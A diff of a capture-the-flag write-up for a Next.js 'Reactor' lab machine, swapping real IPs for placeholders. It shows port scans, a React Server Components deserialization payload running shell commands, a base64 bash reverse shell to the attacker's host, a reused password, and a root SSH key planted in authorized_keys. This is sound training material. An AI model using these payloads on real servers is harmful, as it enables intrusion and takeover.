@@ -23,7 +23,7 @@ Reactor is a Next.js monitoring dashboard for a nuclear reactor. The front end i
 
 ### NMAP Scan
 ```bash
-sudo nmap -p- --min-rate 10000 10.129.91.79
+sudo nmap -p- --min-rate 10000 machine_ip
 ```
 ```text
 PORT     STATE SERVICE
@@ -34,7 +34,7 @@ PORT     STATE SERVICE
 SSH and something on 3000. Running scripts/version detection:
 
 ```bash
-sudo nmap -p 22,3000 -sCV 10.129.91.79
+sudo nmap -p 22,3000 -sCV machine_ip
 ```
 ```text
 22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
@@ -58,13 +58,13 @@ The site is a monitoring dashboard for a nuclear reactor. It's completely static
 `feroxbuster` only turns up the framework's own JavaScript chunks under `/_next/static/` - nothing application-specific:
 
 ```bash
-feroxbuster -u http://10.129.91.79:3000
+feroxbuster -u http://machine_ip:3000
 ```
 ```text
-200  GET  http://10.129.91.79:3000/_next/static/chunks/517-d083b552e04dead1.js
-200  GET  http://10.129.91.79:3000/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js
-200  GET  http://10.129.91.79:3000/_next/static/chunks/webpack-db0a529a99835594.js
-200  GET  http://10.129.91.79:3000/
+200  GET  http://machine_ip:3000/_next/static/chunks/517-d083b552e04dead1.js
+200  GET  http://machine_ip:3000/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js
+200  GET  http://machine_ip:3000/_next/static/chunks/webpack-db0a529a99835594.js
+200  GET  http://machine_ip:3000/
 ...
 ```
 
@@ -72,16 +72,16 @@ feroxbuster -u http://10.129.91.79:3000
 There's no `__NEXT_DATA__` object in the HTML, which means this is an **App Router** app (not Pages Router), so there's no easy `buildManifest` to pull. First thing worth checking is whether source maps are exposed - they'd let me rebuild the original source:
 
 ```bash
-for f in $(curl -s http://10.129.91.79:3000 | grep -oE '/_next/static/[^"\\]+\.js'); do
-  echo -n "$f.map -> "; curl -s -o /dev/null -w '%{http_code}\n' "http://10.129.91.79:3000$f.map"
+for f in $(curl -s http://machine_ip:3000 | grep -oE '/_next/static/[^"\\]+\.js'); do
+  echo -n "$f.map -> "; curl -s -o /dev/null -w '%{http_code}\n' "http://machine_ip:3000$f.map"
 done
 ```
 
 All `.map` requests 404, so no luck there. I downloaded the five referenced JS files and beautified them:
 
 ```bash
-for f in $(curl -s http://10.129.91.79:3000 | grep -oE '/_next/static/[^"\\]+\.js' | sort -u); do
-  wget "http://10.129.91.79:3000$f"
+for f in $(curl -s http://machine_ip:3000 | grep -oE '/_next/static/[^"\\]+\.js' | sort -u); do
+  wget "http://machine_ip:3000$f"
 done
 npx js-beautify -r *.js
 ```
@@ -151,14 +151,14 @@ Content-Disposition: form-data; name="4"
 ------R2S
 Content-Disposition: form-data; name="5"
 
-{"_prefix": "process.mainModule.require('child_process').execSync('ping -c 1 10.10.15.169')//", "_formData": {"get": "$4:constructor:constructor"}, "_chunks": "$2:_response:_chunks", "_bundlerConfig": {}}
+{"_prefix": "process.mainModule.require('child_process').execSync('ping -c 1 your_ip')//", "_formData": {"get": "$4:constructor:constructor"}, "_chunks": "$2:_response:_chunks", "_bundlerConfig": {}}
 ------R2S--
 ```
 
 The payload loads `child_process` and pings my host. It has to reach the module loader the long way - the function is built in global scope where there's no `require`, but `process` is a true global, so `process.mainModule.require` gets to the loader. I send it with a `Next-Action` header (the value is irrelevant; the decoder runs before React validates the action ID):
 
 ```bash
-curl --max-time 1 -X POST http://10.129.91.79:3000/ \
+curl --max-time 1 -X POST http://machine_ip:3000/ \
   -H "Next-Action: 0xdf" \
   -H "Content-Type: multipart/form-data; boundary=----R2S" \
   --data-binary @r2s-body.txt
@@ -170,7 +170,7 @@ The request times out - expected, since the forged thenable never resolves and R
 sudo tcpdump -ni tun0 icmp
 ```
 ```text
-IP 10.129.91.79 > 10.10.15.169: ICMP echo request ...
+IP machine_ip > your_ip: ICMP echo request ...
 ```
 
 RCE confirmed.
@@ -179,7 +179,7 @@ RCE confirmed.
 I swap the `ping` for a base64-encoded bash reverse shell. base64 can emit `+` and `/`, and `+` decodes to a space if the body ever gets treated as URL-encoded form data - so I pad the command with extra spaces until the output is clean of both:
 
 ```bash
-echo 'bash  -i >& /dev/tcp/10.10.15.169/443 0>&1  ' | base64
+echo 'bash  -i >& /dev/tcp/your_ip/443 0>&1  ' | base64
 # YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTY5LzQ0MyAwPiYxICAK
 ```
 
@@ -192,7 +192,7 @@ New `_prefix` field:
 With `nc` listening on 443, fire it off:
 
 ```bash
-curl --max-time 1 -X POST http://10.129.91.79:3000/ \
+curl --max-time 1 -X POST http://machine_ip:3000/ \
   -H "Next-Action: 0xdf" \
   -H "Content-Type: multipart/form-data; boundary=----R2S" \
   --data-binary @r2s-shell.txt
@@ -263,7 +263,7 @@ su - engineer
 # Password: reactor1
 ```
 ```bash
-sshpass -p '||reactor1||' ssh engineer@10.129.91.79
+sshpass -p '||reactor1||' ssh engineer@machine_ip
 ```
 ```text
 engineer@reactor:~$ cat user.txt
@@ -329,7 +329,7 @@ exec("process.mainModule.require('fs').appendFileSync('/root/.ssh/authorized_key
 Then SSH in as root:
 
 ```bash
-ssh -i ~/keys/ed25519_gen root@10.129.91.79
+ssh -i ~/keys/ed25519_gen root@machine_ip
 ```
 ```text
 root@reactor:~# cat root.txt
